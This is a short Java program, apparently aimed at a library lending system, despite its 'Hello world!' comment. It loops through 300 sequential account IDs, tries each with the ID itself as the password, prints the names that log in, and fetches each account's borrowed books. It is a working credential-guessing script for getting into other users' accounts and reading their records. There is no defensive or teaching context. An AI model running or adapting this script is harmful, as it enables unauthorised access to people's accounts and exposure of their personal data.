package com.xixi.LibApp;


import demo.HttpClient;

/**
 * Hello world!
 *
 */
public class App 
{
    public static void main( String[] args )
    {
    	HttpClient client=new HttpClient();
    	String baseName="221150";
    	String basePass=baseName;
    	int num=8030;
    	for (int i = 0; i < 300; i++) {
    		client.setName(baseName+(num+i));
    		client.setPass(basePass+(num+i));
    		boolean flag=client.login();
    		if(flag)
    			System.out.println(client.getName());
    			client.getBorrowBooks();
		}
    	
    	
    	
    }
}
